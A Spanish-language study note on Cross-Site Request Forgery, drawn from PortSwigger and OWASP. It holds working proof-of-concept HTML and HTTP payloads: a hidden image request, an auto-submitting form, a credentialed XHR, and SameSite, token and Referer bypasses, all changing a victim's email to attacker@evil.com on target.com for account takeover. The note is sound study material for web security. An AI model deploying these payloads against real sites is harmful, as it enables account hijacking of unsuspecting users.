---
title: "CSRF — Cross-Site Request Forgery"
type: note
status: active
tags:
  - seguridad
  - web
  - csrf
  - vulnerabilidades
aliases:
  - Cross-Site Request Forgery
  - CSRF
  - Session Riding
created: 2026-06-13
updated: 2026-06-13
---

# CSRF — Cross-Site Request Forgery

> [!INFO] Fuente
> PortSwigger CSRF, OWASP CSRF.

---

## Que es

Un ataque que fuerza a la victima a ejecutar una accion no deseada en una aplicacion donde esta autenticada. La victima no necesita hacer clic ni saber — si visita una pagina maliciosa mientras tiene sesion activa, la accion se ejecuta.

---

## Ejemplo basico

**Escenario**: target.com permite cambiar email via GET sin CSRF token.

```html
<!-- Pagina alojada en evil.com -->
<html>
<body>
  <h1>Felicitaciones, ganaste un premio!</h1>
  <img src="https://target.com/api/email/change?email=attacker@evil.com" style="display:none">
</body>
</html>
```

Si la victima visita evil.com mientras tiene sesion en target.com, la peticion GET cambia su email. El atacante hace "forgot password" → token al attacker email → ATO.

---

## CSRF en POST

```html
<html>
<body>
<form action="https://target.com/api/email/change" method="POST" id="csrf-form">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

---

## Bypass de SameSite

SameSite=Lax protege la mayoria de CSRF en POST, pero hay bypasses:

### SameSite=Lax bypass via GET

```html
<script>
// Si el endpoint tambien acepta GET, SameSite=Lax no protege
var img = new Image();
img.src = "https://target.com/api/email/change?email=attacker@evil.com";
</script>
```

### SameSite=Strict bypass via subdominio

```html
<!-- Si hay un subdominio sin SameSite=Strict que cargue contenido -->
<iframe src="https://old-app.target.com/upload" name="csrf"></iframe>
<form target="csrf" ...>
```

### SameSite=None

Si la app usa `SameSite=None; Secure`, las cookies se envian en cross-site → CSRF posible.

---

## Bypass de tokens CSRF

| Tecnica | Descripcion |
|---------|-------------|
| Token en URL | Si el token va en GET, queda en historial/logs |
| Token predecible | MD5(email+date), secuencial, hash debil |
| Token en cookie no vinculada | Cookie con CSRF token = mismo valor que parametro |
| Token no validado rigurosamente | Metodo, tipo de content erroneo no valida |
| Token reusable | Mismo token funciona multiples veces |
| Anti-CSRF ausente en ciertos metodos | PATCH, DELETE sin proteccion |

### Cookie + Param = mismo valor

```http
Set-Cookie: csrf=abc123
...
POST /api/email/change HTTP/1.1
Cookie: csrf=abc123

csrf=abc123
```

Si los valores son iguales y no hay validacion cruzada, podes setear la cookie via subdominio/otra funcionalidad y usar ese mismo valor.

### Missing anti-CSRF en JSON endpoints

```http
POST /api/email/change HTTP/1.1
Content-Type: application/json

{"email": "attacker@evil.com"}
```

Muchos endpoints JSON no tienen proteccion CSRF porque "JSON no se puede enviar desde un form HTML". Pero se puede viaje fetch() con mode: 'no-cors'.

---

## Referer-based CSRF

```html
<!-- Si la app verifica Referer, a veces lo hace mal -->
<!-- Referer vacio puede bypassear -->
<meta name="referrer" content="never">

<!-- Si solo verifica que contenga target.com -->
<!-- Usar subdominio propio o path -->
Referer: https://target.com.evil.com/
```

---

## CSRF con JSON + XHR

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/email/change", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = true;
xhr.send(JSON.stringify({email: "attacker@evil.com"}));
</script>
```

> [!WARNING] CORS
> Esto solo funciona si la API tiene CORS permisivo (`ACAO: *` o refleja Origin). Si no, el request se envia pero no podes leer la respuesta.

---

## CSRF PoC generator

Burp Suite tiene un generador de PoC CSRF incorporado:

```
1. Capturar request vulnerable
2. Right-click → Engagement tools → Generate CSRF PoC
3. Te genera HTML listo para alojar en evil.com
4. Probar en browser con sesion activa
```

---

## Labs

| Recurso | Link |
|---------|------|
| PortSwigger CSRF | portswigger.net/web-security/csrf |

---

## Ver tambien

- [[SEGURIDAD/Vulnerabilidades Web]]
- [[SEGURIDAD/XSS]]
- [[SEGURIDAD/00 - INDICE]]
